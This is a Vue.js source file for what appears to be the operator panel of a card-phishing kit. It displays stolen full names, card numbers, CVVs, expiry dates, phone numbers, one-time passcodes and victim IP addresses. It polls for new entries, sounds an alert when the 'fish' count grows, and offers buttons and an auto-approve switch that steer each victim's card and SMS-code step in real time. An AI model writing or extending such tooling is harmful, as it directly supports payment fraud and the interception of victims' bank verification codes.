<template>
  <div>
    <v-card class="px-5">
      <audio id="audioMusic" class="audio" src="@/assets/tips.wav" controls autoplay="autoplay" hidden="true"
             ref="audio"></audio>
      <v-card-title>
         {{ desserts.length }}
        <v-spacer></v-spacer>
        <v-text-field
            v-model="search"
            append-icon="mdi-magnify"
            label="Search"
            single-line
            hide-details
        ></v-text-field>
      </v-card-title>
      <v-data-table
          :search="search"
          v-model="selected"
          :headers="headers"
          :items="desserts"
          :items-per-page="50"
          class="elevation-1"
          item-key="id"
          show-select
          checkbox-color="indigo"
      >
        <template v-slot:[`item.card_action`]="props">
          <v-btn
              dark
              small
              class="mr-5"
              color="green"
              @click="let_card_pass(props.item.id,'')"
          >
            
          </v-btn>
          <v-btn
              dark
              color="red"
              small
              @click="let_card_pass(props.item.id,'')"
          >
            
          </v-btn>
        </template>
        <template v-slot:[`item.sms_action`]="props">
          <v-btn
              dark
              small
              class="mr-5"
              color="green"
              @click="let_sms_pass(props.item.id,'')"
          >
            
          </v-btn>
          <v-btn
              dark
              color="red"
              small
              class="mr-5"
              @click="let_sms_pass(props.item.id,'')"
          >
            
          </v-btn>
          <v-btn
              dark
              color="amber darken-4"
              small
              @click="let_sms_pass(props.item.id,'')"
          >
            
          </v-btn>
        </template>
        <template v-slot:top>
          <v-switch
              v-model="auto_pass_card"
              label=""
              class="pa-3"
          ></v-switch>
        </template>
        <template v-slot:[`item.card_number`]="props">
          <button text @click="show_card(props.item)">{{ props.item.card_number }}</button>
        </template>
      </v-data-table>
      <v-dialog v-model="show_card_pic" width="430px" height="270px">
        <v-card elevation="5" style="font-family: Source Code Pro,monospace">
          <v-img src="@/assets/images/img_1.png" width="430px" height="270px">
            <v-overlay
                opacity="0.1"
                value="show_card_pic"
                :absolute=true>
            </v-overlay>
            <div>
              <v-row class="mt-2">
                <v-col cols="5" class="ml-4">
                  <v-img src="@/assets/images/chip.png" width="60px">
                  </v-img>
                </v-col>
                <v-col cols="3" offset="3" class="mt-2">
                  <v-img src="@/assets/images/visa.png" width="60px"
                         v-if="show_card_data['show_card_num'].toString().slice(0,1) === '4'">
                  </v-img>
                  <v-img src="@/assets/images/mastercard.png" width="60px"
                         v-if="show_card_data['show_card_num'].toString().slice(0,1) === '5'">
                  </v-img>
                </v-col>
              </v-row>
              <v-row class="mt-8"
                  style="color:#fff;font-size: 26px;text-shadow: 7px 6px 10px rgb(14 42 90 / 80%);font-weight: 700;padding: 0 24px 0 24px">
                <v-col cols="3">
                  {{ show_card_data['show_card_num'].toString().slice(0, 4) }}
                </v-col>
                <v-col cols="3">
                  {{ show_card_data['show_card_num'].slice(4, 8) }}
                </v-col>
                <v-col cols="3">
                  {{ show_card_data['show_card_num'].slice(8, 12) }}
                </v-col>
                <v-col cols="3">
                  {{ show_card_data['show_card_num'].slice(12, 16) }}
                </v-col>
              </v-row>
              <v-row style="color:#e2e8f0;font-size: 14px" class="mt-8">
                <v-col cols="4" class="ml-6">
                  Card holder
                </v-col>
                <v-col cols="2" offset="1">
                  CVV
                </v-col>
                <v-col cols="3" offset="1">
                  Expires
                </v-col>
              </v-row>
              <v-row style="color:#fff;font-size: 18px" class="mt-0 mb-1 pl-0" >
                <v-col cols="4" class="ml-6">
                  {{ show_card_data['show_card_name'] }}
                </v-col>
                <v-col cols="2" offset="1">
                  {{ show_card_data['show_card_cvv'] }}
                </v-col>
                <v-col cols="3" offset="1">
                  {{ show_card_data['show_card_exp'] }}
                </v-col>
              </v-row>
            </div>
          </v-img>
        </v-card>
      </v-dialog>
      <div class="text-right pt-10 pb-2 pr-5">
        <v-btn color="blue" dark class="mr-5" @click="get_all_data"></v-btn>
        <v-btn color="red" dark @click="delete_data"></v-btn>
      </div>
    </v-card>
    <v-snackbar
        v-model="snack"
        :timeout="3000"
        top
        :color="snackColor"
    >
      <div class="text-center">{{ snackText }}</div>
    </v-snackbar>
  </div>
</template>

<script>
import axios from 'axios'
import api from '@/api/index'

export default {
  name: "data_manage",
  // ['ID','',"","","","IP",""]
  data: () => ({
    show_card_pic: false,
    isPlay: false,
    auto_pass_card: false,
    change_status: ['', ''],
    snack: false,
    snackColor: '',
    snackText: '',
    search: '',
    dialogDelete: false,
    selected: [],
    show_card_data: {
      show_card_num: '',
      show_card_name: '',
      show_card_cvv: '',
      show_card_exp: '',
    },
    headers: [{
      text: 'ID',
      align: 'start',
      value: 'id'
    },
      {text: '', value: 'status'},
      {text: '', value: 'full_name'},
      {text: '', value: 'card_number'},
      {text: '', value: 'exp_date'},
      {text: 'CVV', value: 'cvv'},
      {text: '', value: 'zip'},
      {text: '', value: 'phonenumber'},
      {text: '', value: 'card_action', align: 'center',},
      {text: '', value: 'otp'},
      {text: '', value: 'sms_action', align: 'center',},
      {text: 'IP', value: 'ip'},
      {text: '', value: 'time'},
    ],
    last_fish: 0,
    desserts: []
  }),
  methods: {
    musicAutoPlay() {
      this.isPlay = true;
    },
    save(row) {
      this.let_pass(row['id'], row['status'])
    },
    cancel() {
      this.snack = true
      this.snackColor = 'error'
      this.snackText = ''
    },
    get_all_data() {
      const url = api.get_data
      axios.get(url)
          .then(response => {
            if (response.data !== 'error') {
              this.desserts = response.data.all_data
              // for (let i in response.data.all_data) {
              //   if (response.data.all_data[i]['card_number'] !== null) {
              //     let card_number = response.data.all_data[i]['card_number']
              //     response.data.all_data[i]['card_number'] = card_number.slice(0, 4) + '-' + card_number.slice(4, 8) + '-' + card_number.slice(8, 12) + '-' + card_number.slice(12, card_number.length)
              //     this.desserts.push(response.data.all_data[i])
              //   }
              // }
              if (this.last_fish === 0) {
                this.last_fish = response.data.all_data.length
              } else if (this.last_fish < response.data.all_data.length) {
                this.last_fish = response.data.all_data.length
                document.getElementById('audioMusic').play();
              } else {
                this.last_fish = response.data.all_data.length
              }
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
              this.auto_pass()
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }

          })
    },
    let_card_pass(id, status) {
      const url = '/api/set_card_status'
      const params = new URLSearchParams();
      params.append('id', id)
      params.append('status', status)
      axios.post(url, params)
          .then(response => {
            if (response.data === 'ok') {
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }
          })
    },
    let_sms_pass(id, status) {
      const url = '/api/set_otp_status'
      const params = new URLSearchParams();
      params.append('id', id)
      params.append('status', status)
      axios.post(url, params)
          .then(response => {
            if (response.data === 'ok') {
              this.snack = true
              this.snackColor = 'success'
              this.snackText = ''
            } else {
              this.snack = true
              this.snackColor = 'error'
              this.snackText = ''
            }
          })
    },
    delete_data() {
      if (this.selected.length <= 0) {
        this.snack = true
        this.snackColor = 'error'
        this.snackText = ''
      } else {
        let i;
        let id;
        for (i in this.selected) {
          id = this.selected[i]["id"] + ',' + id
        }
        id = id.replace(',undefined', '')
        const url = api.delete_data
        const params = new URLSearchParams();
        params.append('id', id)
        axios.post(url, params)
            .then(response => {
              if (response.data === 'ok') {
                this.snack = true
                this.snackColor = 'success'
                this.snackText = ''
                this.get_all_data()
              } else {
                this.snack = true
                this.snackColor = 'error'
                this.snackText = ''
              }
            })
      }

    },
    loop_task() {
      setInterval(this.get_all_data, 10000);
    },
    auto_pass() {
      if (this.auto_pass_card === true) {
        for (let i in this.desserts) {
          if (this.desserts[i].status === "") {
            this.let_card_pass(this.desserts[i].id, '')
          }
        }
      }
    },
    show_card(val) {
      this.show_card_data['show_card_num'] = val['card_number']
      this.show_card_data['show_card_name'] = val['full_name'].toUpperCase()
      this.show_card_data['show_card_cvv'] = val['cvv']
      this.show_card_data['show_card_exp'] = val['exp_date']
      this.show_card_pic = true
    }

  },
  mounted() {
    this.get_all_data()
    this.loop_task()
    window.addEventListener("click", this.musicAutoPlay);
  }
}

</script>

<style scoped>
@font-face {
  font-family: "Source Code Pro";
  src: url('https://fonts.gstatic.com/s/sourcecodepro/v22/HI_SiYsKILxRpg3hIP6sJ7fM7PqlPevW.woff2');
  font-weight: normal;
  font-style: normal;
}
</style>
